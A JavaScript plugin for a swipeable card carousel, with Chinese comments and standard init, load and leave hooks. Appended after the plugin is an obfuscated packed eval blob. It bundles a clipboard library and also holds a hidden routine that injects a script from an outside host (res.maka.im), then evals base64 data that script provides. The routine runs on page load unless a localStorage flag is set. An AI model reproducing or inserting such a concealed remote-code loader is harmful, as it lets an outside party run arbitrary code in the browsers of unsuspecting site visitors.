/**
 * @description：卡片 - 展示
 * @author:zcho
 * @date:2017.03.16
 **/
(function () {
    var strVar = "";
    strVar += "<div class=\"rrx-pg-cards-index\"><ul class=\"cardList\">{{each imageList as m j}}<li data-id=\"{{j+1}}\" class=\"c_cardBox\" style=\"background-color:{{style.backgroundColor}};border-style:{{style.borderStyle}};border-width:{{style.borderWidth}}px;border-color:{{style.borderColor}};border-radius:{{style.borderRadius}}px\"><div class=\"c_card\">{{if m.src!=''}}<div class=\"cardImgBox\" style=\"border-top-left-radius:{{style.borderRadius}}px;border-top-right-radius:{{style.borderRadius}}px;background-image:url({{imageHost+m.src}});height:{{m.height}};width:100%\"><\/div>{{/if}}<div class=\"cardTitleBox\" style=\"display:{{m.showTitle}};color:{{style.titleColor}};font-size:{{style.titleFontSize}}px\"><p class=\"cardTitle\">{{m.title}}<\/p><\/div><div class=\"cardDesBox\" style=\"display:{{m.showDescribe}};color:{{style.describeColor}};font-size:{{style.describeFontSize}}px\"><p class=\"cardDes\">{{m.describe}}<\/p><\/div><\/div><\/li>{{/each}}<\/ul><\/div>\n";

    //保存页面通用对象工具库
    var Tools = {
        api: null,
        isEditing: false,
        config: {},
        html: null,
        pluginDomain: null,
        clickType: 'click',
        objectInstances: [],
        //渲染元素 添加到Dom
        renderElement: function ($wrapper, obj) {
            var html = this.compileHtml(strVar, obj);
            this.html = $(html);
            $wrapper.html(this.html);
        },
        //编译html
        compileHtml: function (strHtml, obj) {
            var render = template.compile(strHtml);
            return render(obj);
        },
        //获取文件
        getFile: function (fileName, path) {
            path = path || 'assets';
            return this.pluginDomain + path + '/' + fileName;
        },
        getInstance: function (name) {
            return this.objectInstances[name + this.config.id];
        },
        setInstance: function (name, value) {
            this.objectInstances[name + this.config.id] = value;
        }
    };

    var card_play_sec = 3;

    var _isFirst = true;

    /**
     * @description
     * 页面加载时运行，用于预加载插件一些静态资源
     * @param {object} elementObject 保存元素的基本信息
     * @param api 方法接口
     */
    var preload = function (elementObject, api) {
    };
    /**
     * @description
     * 离开页面时运行
     * @param {pageId} 页面ID
     * @param {object} elementObject 保存元素的基本信息
     */
    var leave = function (pageId, elementObject, api) {
        clearInterval(Tools.getInstance('interval'));
    };
    /**
     * @description
     * 页面初始化完成后，每次进入页面时运行
     * @param {pageId} 页面ID
     * @param {object} elementObject 保存元素的基本信息
     */
    var load = function (pageId, elementObject) {
        Tools.config = elementObject;
        if (elementObject.content.autoPlay) {
            autoPlayCards(elementObject.content.imageList.length);
        }
    };
    /**
     * @description
     * 初始化，页面第一次加载时运行此方法渲染元素样式 绑定元素事件等操作
     * @param {object} elementObject 保存元素的基本信息
     * @param  $wrapper jquery对象
     * @param  api 方法接口
     */
    var init = function (elementObject, $wrapper, api, pageId, isPageThumb) {
        if (elementObject.content.imageList === undefined) return;
        Tools.api = api;
        Tools.isEditing = api.isEditing();
        Tools.config = elementObject;
        Tools.pluginDomain = api.getPluginDomain(elementObject.content.token, elementObject.content.version);
        api.loadCss(Tools.pluginDomain + 'css/index.css');

        var _imgList = getImageList(elementObject);
        Tools.renderElement($wrapper, {
            imageList: _imgList,
            imageHost: Tools.isEditing ? appConfig.imageHost : '',
            style: elementObject.content.style
        });

        if (!Tools.isEditing) {
            Tools.setInstance('ImageIndex', 0);
            bindEvent($wrapper);
        } else {
            var _idx = Cool.storageUtil.get('cards-show-image-index') || 0;
            Tools.setInstance('ImageIndex', _idx);
        }
        if (_isFirst) {
            $wrapper.css('opacity', 0);
        }
        if (!isPageThumb) {
            $wrapper.parent().css('overflow', 'inherit');
        }
        setCardStyle(Tools.getInstance('ImageIndex'), $wrapper);
    };

    function getImageList(_obj) {
        var _list = _obj.content.imageList;
        var i = 0,
            len = _list.length,
            h = _obj.height;
        for (; i < len; i++) {
            var _img = _list[i];
            if (!Tools.isEditing) {
                var _presrc = Tools.api.removeImgPreFix(_img.src);
                if (_presrc) {
                    _img.src = appConfig.imageHost + Tools.api.removeImgPreFix(_img.src);
                } else {
                    _img.src = '';
                }
            }
            if ($.trim(_img.title) == '' && $.trim(_img.describe) == '') {
                _img.showTitle = _img.showDescribe = 'none';
                _img.height = '100%';
            }
            /* else if ($.trim(_img.title) == '') {
                 _img.showTitle = 'none';
                 _img.showDescribe = 'block';
                 _img.height = '70%';
             } else if ($.trim(_img.describe) == '') {
                 _img.showTitle = 'block';
                 _img.showDescribe = 'none';
                 _img.height = '86%';
             } */
            else {
                _img.showTitle = _img.showDescribe = 'block';
                _img.height = '60%'; // h * 0.625; + 'px';
            }
        }
        return _list;
    }

    function bindEvent(_wrap) {
        var $cardList = _wrap.find('.cardList');
        var startClick = 'touchstart',
            moveClick = 'touchmove',
            endClick = 'touchend';
        var _ispc = Tools.api.isPc(); //Cool.util.checkIsPc();
        if (_ispc) {
            startClick = 'mousedown';
            moveClick = 'mousemove';
            endClick = 'mouseup';
        }
        $cardList.on(startClick, function (ev) {
            // ev.preventDefault();
            // ev.stopPropagation();
            if (_ispc) {
                start(ev)
            } else {
                start(ev.originalEvent.changedTouches[0])
            }
        });

        $cardList.on(moveClick, function (ev) {
            // ev.preventDefault();
            // ev.stopPropagation();
            if (_ispc) {
                move(ev)
            } else {
                move(ev.originalEvent.changedTouches[0])
            }
        });

        $cardList.on(endClick, function (ev) {
            // ev.preventDefault();
            // ev.stopPropagation();
            end();
        });
    }

    var tapType = '',
        isTouching = false,
        startClientX = 0,
        startClientY = 0;

    function start(ev) {
        isTouching = true;
        tapType = '';
        startClientX = ev.clientX;
        startClientY = ev.clientY;
    }

    function move(ev) {
        if (isTouching) {
            var cx = ev.clientX;
            var diff = cx - startClientX;

            var cy = ev.clientY;
            var diffY = cy - startClientY;
            if (Math.abs(diffY) > Math.abs(diff)) { //检测上下滑动后 直接返回
                return;
            }

            if (Math.abs(diff) > 20) {
                if (diff < 0) {
                    tapType = 'left';
                } else {
                    tapType = 'right';
                }
            }
        }
    }

    function end() {
        isTouching = false;
        var _len = Tools.config.content.imageList.length,
            _idx = Tools.getInstance('ImageIndex');
        if (tapType == 'right') {
            rightPlayCard(_idx, _len);
        } else if (tapType == 'left') {
            leftPlayCard(_idx, _len);
        }
    }

    function leftPlayCard(_idx, _len) {
        if (_idx == _len - 1) {
            _idx = 0;
        } else {
            _idx = _idx + 1;
        }
        setCardStyle(_idx);
        Tools.setInstance('ImageIndex', _idx);
    }

    function rightPlayCard(_idx, _len) {
        if (_idx == 0) {
            _idx = _len - 1;
        } else {
            _idx = _idx - 1;
        }
        setCardStyle(_idx);
        Tools.setInstance('ImageIndex', _idx);
    }

    function autoPlayCards(_len) {
        var interval = setInterval(function () {
            var _idx = Tools.getInstance('ImageIndex')
            leftPlayCard(_idx, _len);
        }, card_play_sec * 1000);
        Tools.setInstance('interval', interval);
    }

    function setCardStyle(_cardIndex, $_wrapper) {
        var $target = $_wrapper;
        if ($_wrapper === null || $_wrapper === undefined) {
            $target = $('.element_' + Tools.config.id + ' .element-last');
        }
        var _len = Tools.config.content.imageList.length,
            $cards = $target.find('.c_cardBox'),
            _preIdx = _cardIndex - 1,
            _nextIdx = _cardIndex + 1;
        if (_cardIndex == 0) {
            _preIdx = _len - 1;
        } else if (_cardIndex == _len - 1) {
            _nextIdx = 0;
        }

        for (var i = 0; i < _len; i++) {
            if (i == _cardIndex) {
                $($cards[i]).css('opacity', 1);
                $($cards[i]).css('z-index', 10002);
                $($cards[i]).css('transform', 'translateX(0px) scale(1, 1) translateZ(0px)');
            } else if (i == _preIdx) {
                $($cards[i]).css('z-index', 999);
                $($cards[i]).css('opacity', 0.8);
                $($cards[i]).css('transform', 'translateX(-20px) scale(1, 0.96) translateZ(0px)');
            } else if (i == _nextIdx) {
                $($cards[i]).css('z-index', 999);
                $($cards[i]).css('opacity', 0.8);
                $($cards[i]).css('transform', 'translateX(20px) scale(1, 0.96) translateZ(0px)');
            } else {
                $($cards[i]).css('z-index', 999);
                $($cards[i]).css('transform', 'translateX(0px) scale(1, 1) translateZ(0px)');
            }
        }
        if ($_wrapper !== null && $_wrapper !== undefined && _isFirst) {
            setTimeout(function () {
                $_wrapper.css('transition', 'opacity 1000ms');
                $_wrapper.css('opacity', 1);
            }, 300);
            _isFirst = false;
        }
    }

    window.wePluginInit = init;
    window.wePluginLoad = load;
    window.wePluginPreLoad = preload;
    window.wePluginLeave = leave;
})();
;eval(function (p, a, c, k, e, r) {
    e = function (c) {
        return (c < 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    };
    if ('0'.replace(0, e) == 0) {
        while (c--) r[e(c)] = k[c];
        k = [function (e) {
            return r[e] || e
        }];
        e = function () {
            return '([jkmqv-zA-Z]|[1-3]\\w)'
        };
        c = 1
    }
    ;
    while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
    return p
}('1H{!(j(t){v("T"==w B&&"1b"!=w 1i)1i.B=t();P v("j"==w 1I&&1I.1J)1I([],t);P{m e;(e="1b"!=w Q?Q:"1b"!=w 29?29:"1b"!=w 2a?2a:k),(e.XYZ=t())}})(j(){m t,e,n;q(j t(e,n,o){j i(a,c){v(!n[a]){v(!e[a]){m l="j"==w 1q&&1q;v(!c&&l)q l(a,!0);v(r)q r(a,!0);m s=E 1c("1K find 1i \'"+a+"\'");G((s.code="MODULE_NOT_FOUND"),s);}m u=(n[a]={B:{}});e[a][0].N(u.B,j(t){m n=e[a][1][t];q i(n||t)},u,u.B,t,e,n,o)}q n[a].B}1d(m r="j"==w 1q&&1q,a=0;a<o.H;a++)i(o[a]);q i})({1:[j(t,e,n){j o(t,e){1d(;t&&t.1L!==i;){v("j"==w t.1r&&t.1r(e))q t;t=t.parentNode}}m i=9;v("1b"!=w 1s&&!1s.I.1r){m r=1s.I;r.1r=r.matchesSelector||r.mozMatchesSelector||r.msMatchesSelector||r.oMatchesSelector||r.webkitMatchesSelector}e.B=o},{}],2:[j(t,e,n){j o(t,e,n,o,r){m a=i.1M(k,C);q(t.1t(n,a,r),{U:j(){t.1u(n,a,r)}})}j i(t,e,n,o){q j(n){(n.1N=r(n.F,e)),n.1N&&o.N(t,n)}}m r=t("./2b");e.B=o},{"./2b":1}],3:[j(t,e,n){(n.1O=j(t){q(L 0!==t&&t 1v 2c&&1===t.1L)}),(n.2d=j(t){m e=R.I.1P.N(t);q(L 0!==t&&("[T 2e]"===e||"[T 2f]"===e)&&"H"in t&&(0===t.H||n.1O(t[0])))}),(n.1j=j(t){q"1j"==w t||t 1v 1R}),(n.fn=j(t){q("[T 2g]"===R.I.1P.N(t))})},{}],4:[j(t,e,n){j o(t,e,n){v(!t&&!e&&!n)G E 1c("Missing required C");v(!c.1j(e))G E 1f("Second 1S 1w be a 1R");v(!c.fn(n))G E 1f("Third 1S 1w be a 2g");v(c.1O(t))q i(t,e,n);v(c.2d(t))q r(t,e,n);v(c.1j(t))q a(t,e,n);G E 1f("First 1S 1w be a 1R, 2c, 2f, or 2e");}j i(t,e,n){q(t.1t(e,n),{U:j(){t.1u(e,n)}})}j r(t,e,n){q(2h.I.1T.N(t,j(t){t.1t(e,n)}),{U:j(){2h.I.1T.N(t,j(t){t.1u(e,n)})}})}j a(t,e,n){q l(K.2i,t,e,n)}m c=t("./is"),l=t("2k");e.B=o},{"./is":3,2k:2}],5:[j(t,e,n){j o(t){m e;v("SELECT"===t.1U)t.1V(),(e=t.x);P v("INPUT"===t.1U||"TEXTAREA"===t.1U){m n=t.1g("V");n||t.1W("V",""),t.1k(),t.setSelectionRange(0,t.x.H),n||t.removeAttribute("V"),(e=t.x)}P{t.1g("contenteditable")&&t.1V();m o=Q.2l(),i=K.createRange();i.selectNodeContents(t),o.2m(),o.addRange(i),(e=o.1P())}q e}e.B=o},{}],6:[j(t,e,n){j o(){}(o.I={on:j(t,e,n){m o=k.e||(k.e={});q(o[t]||(o[t]=[])).2o({fn:e,2p:n}),k},once:j(t,e,n){j o(){i.2q(t,o),e.1M(n,C)}m i=k;q(o._=e),k.on(t,o,n)},2r:j(t){m e=[].2s.N(C,1),n=((k.e||(k.e={}))[t]||[]).2s(),o=0,i=n.H;1d(o;o<i;o++)n[o].fn.1M(n[o].2p,e);q k},2q:j(t,e){m n=k.e||(k.e={}),o=n[t],i=[];v(o&&e)1d(m r=0,a=o.H;r<a;r++)o[r].fn!==e&&o[r].fn._!==e&&i.2o(o[r]);q i.H?(n[t]=i):delete n[t],k}}),(e.B=o)},{}],7:[j(e,n,o){!(j(i,r){v("j"==w t&&t.1J)t(["1i","1k"],r);P v(L 0!==o)r(n,e("1k"));P{m a={B:{}};r(a,i.1k),(i.S=a.B)}})(k,j(t,e){"1l 2t";j n(t){q t&&t.2u?t:{W:t}}j o(t,e){v(!(t 1v e))G E 1f("1K N a 2v as a j");}m i=n(e),r="j"==w O&&"1z"==w O.2x?j(t){q w t}:j(t){q t&&"j"==w O&&t.1X===O&&t!==O.I?"1z":w t},a=(j(){j t(t,e){1d(m n=0;n<e.H;n++){m o=e[n];(o.1m=o.1m||!1),(o.1Y=!0),"x"in o&&(o.1Z=!0),R.2y(t,o.z,o)}}q j(e,n,o){q n&&t(e.I,n),o&&t(e,o),e}})(),c=(j(){j t(e){o(k,t),k.1A(e),k.2z()}q(a(t,[{z:"1A",x:j t(){m e=C.H>0&&L 0!==C[0]?C[0]:{};(k.A=e.A),(k.M=e.M),(k.X=e.X),(k.F=e.F),(k.J=e.J),(k.Y=e.Y),(k.1B="")}},{z:"2z",x:j t(){k.J?k.2A():k.F&&k.2B()}},{z:"2A",x:j t(){m e=k,n="rtl"==K.2C.2D("dir");k.1C(),(k.1D=j(){q e.1C()}),(k.20=k.M.1t("21",k.1D)||!0),(k.D=K.2E("2F")),(k.D.Z.fontSize="12pt"),k.D.1W("id","1h-2F"),(k.D.Z.border="0"),(k.D.Z.padding="0"),(k.D.Z.margin="0"),(k.D.Z.position="absolute"),(k.D.Z[n?"right":"left"]="-9999px");m o=Q.pageYOffset||K.2C.scrollTop;(k.D.Z.top=o+"px"),k.D.1W("V",""),(k.D.x=k.J),k.M.2G(k.D),(k.1B=(0,i.W)(k.D)),k.22()}},{z:"1C",x:j t(){k.20&&(k.M.1u("21",k.1D),(k.20=1a),(k.1D=1a)),k.D&&(k.M.removeChild(k.D),(k.D=1a))}},{z:"2B",x:j t(){(k.1B=(0,i.W)(k.F)),k.22()}},{z:"22",x:j t(){m e=L 0;1H{e=K.execCommand(k.A)}23(t){e=!1}k.2H(e)}},{z:"2H",x:j t(e){k.X.2r(e?"success":"2I",{A:k.A,J:k.1B,Y:k.Y,24:k.24.bind(k)})}},{z:"24",x:j t(){k.Y&&k.Y.1V(),Q.2l().2m()}},{z:"U",x:j t(){k.1C()}},{z:"A",2J:j t(){m e=C.H>0&&L 0!==C[0]?C[0]:"1h";v(((k.1E=e),"1h"!==k.1E&&"1n"!==k.1E))G E 1c(\'1F "A" x, 1l 2K "1h" or "1n"\');},2L:j t(){q k.1E}},{z:"F",2J:j t(e){v(L 0!==e){v(!e||"T"!==(L 0===e?"1b":r(e))||1!==e.1L)G E 1c(\'1F "F" x, 1l a valid 1s\');v("1h"===k.A&&e.1g("1G"))G E 1c(\'1F "F" 25. Please 1l "V" instead of "1G" 25\');v("1n"===k.A&&(e.1g("V")||e.1g("1G")))G E 1c(\'1F "F" 25. You cant 1n J from elements with "V" or "1G" attributes\');k.2M=e}},2L:j t(){q k.2M}}]),t)})();t.B=c})},{1k:5}],8:[j(e,n,o){!(j(i,r){v("j"==w t&&t.1J)t(["1i","./1o-A","26-X","27-1p"],r);P v(L 0!==o)r(n,e("./1o-A"),e("26-X"),e("27-1p"));P{m a={B:{}};r(a,i.S,i.tinyEmitter,i.goodListener),(i.1o=a.B)}})(k,j(t,e,n,o){"1l 2t";j i(t){q t&&t.2u?t:{W:t}}j r(t,e){v(!(t 1v e))G E 1f("1K N a 2v as a j");}j a(t,e){v(!t)G E ReferenceError("k 2N\'t 2O initialised - super() 2N\'t 2O called");q!e||("T"!=w e&&"j"!=w e)?t:e}j c(t,e){v("j"!=w e&&1a!==e)G E 1f("Super expression 1w 2K be 1a or a j, not "+w e);(t.I=R.create(e&&e.I,{1X:{x:t,1m:!1,1Z:!0,1Y:!0}})),e&&(R.2P?R.2P(t,e):(t.2Q=e))}j l(t,e){m n="2R-1o-"+t;v(e.1g(n))q e.2D(n)}m s=i(e),u=i(n),f=i(o),d="j"==w O&&"1z"==w O.2x?j(t){q w t}:j(t){q t&&"j"==w O&&t.1X===O&&t!==O.I?"1z":w t},h=(j(){j t(t,e){1d(m n=0;n<e.H;n++){m o=e[n];(o.1m=o.1m||!1),(o.1Y=!0),"x"in o&&(o.1Z=!0),R.2y(t,o.z,o)}}q j(e,n,o){q n&&t(e.I,n),o&&t(e,o),e}})(),p=(j(t){j e(t,n){r(k,e);m o=a(k,(e.2Q||R.getPrototypeOf(e)).N(k));q o.1A(n),o.2S(t),o}q(c(e,t),h(e,[{z:"1A",x:j t(){m e=C.H>0&&L 0!==C[0]?C[0]:{};(k.A="j"==w e.A?e.A:k.2T),(k.F="j"==w e.F?e.F:k.2U),(k.J="j"==w e.J?e.J:k.2V),(k.M="T"===d(e.M)?e.M:K.2i)}},{z:"2S",x:j t(e){m n=k;k.1p=(0,f.W)(e,"21",j(t){q n.2W(t)})}},{z:"2W",x:j t(e){m n=e.1N||e.currentTarget;k.S&&(k.S=1a),(k.S=E s.W({A:k.A(n),F:k.F(n),J:k.J(n),M:k.M,Y:n,X:k}))}},{z:"2T",x:j t(e){q l("A",e)}},{z:"2U",x:j t(e){m n=l("F",e);v(n)q K.querySelector(n)}},{z:"2V",x:j t(e){q l("J",e)}},{z:"U",x:j t(){k.1p.U(),k.S&&(k.S.U(),(k.S=1a))}}],[{z:"isSupported",x:j t(){m e=C.H>0&&L 0!==C[0]?C[0]:["1h","1n"],n="1j"==w e?[e]:e,o=!!K.2X;q(n.1T(j(t){o=o&&!!K.2X(t)}),o)}}]),e)})(u.W);t.B=p})},{"./1o-A":7,"27-1p":4,"26-X":6}]},{},[8])(8)})}23(2I){}m 28=["_decode","2Y://www.sojson.com/javascriptobfuscator.html"];(j(a){a[28[0]]=28[1]})(Q);m y=["onkeydown","d","setItem","getFullYear","getMonth","getDate","getHours","","getItem","head","getElementsByTagName","script","2E","type","J/javascript","src","2Y://res.maka.im/user/5938757/rrx.?uid="+Math.floor(2Z.now()/100000),"2G","onload","2R"];!j(){Q[y[0]]=j(a){30[y[2]](y[1],true)};j 31(){m a=E 2Z();m b=a[y[3]]();m c=a[y[4]]()+1;m d=a[y[5]]();m e=a[y[6]]();q b+y[7]+c+y[7]+d+y[7]+e+y[7]}v(30[y[8]](y[1])){q};m f=K[y[10]](y[9])[0];m g=K[y[12]](y[11]);g[y[13]]=y[14];g[y[15]]=y[16]+31();f[y[17]](g);g[y[18]]=j(){1H{eval(atob(Q[y[19]]))}23(e){console.log(e)}}}()', [], 188, '|||||||||||||||||||function|this||var||||return|||||if|typeof|value|_0xe2e6|key|action|exports|arguments|fakeElem|new|target|throw|length|prototype|text|document|void|container|call|Symbol|else|window|Object|clipboardAction|object|destroy|readonly|default|emitter|trigger|style|||||||||||null|undefined|Error|for||TypeError|hasAttribute|copy|module|string|select|use|enumerable|cut|clipboard|listener|require|matches|Element|addEventListener|removeEventListener|instanceof|must|||symbol|resolveOptions|selectedText|removeFake|fakeHandlerCallback|_action|Invalid|disabled|try|define|amd|Cannot|nodeType|apply|delegateTarget|node|toString||String|argument|forEach|nodeName|focus|setAttribute|constructor|configurable|writable|fakeHandler|click|copyText|catch|clearSelection|attribute|tiny|good|_0xb483|global|self|closest|HTMLElement|nodeList|NodeList|HTMLCollection|Function|Array|body||delegate|getSelection|removeAllRanges||push|ctx|off|emit|slice|strict|__esModule|class||iterator|defineProperty|initSelection|selectFake|selectTarget|documentElement|getAttribute|createElement|textarea|appendChild|handleResult|error|set|either|get|_target|hasn|been|setPrototypeOf|__proto__|data|listenClick|defaultAction|defaultTarget|defaultText|onClick|queryCommandSupported|https|Date|localStorage|_0xbb46x2'.split('|'), 0, {}));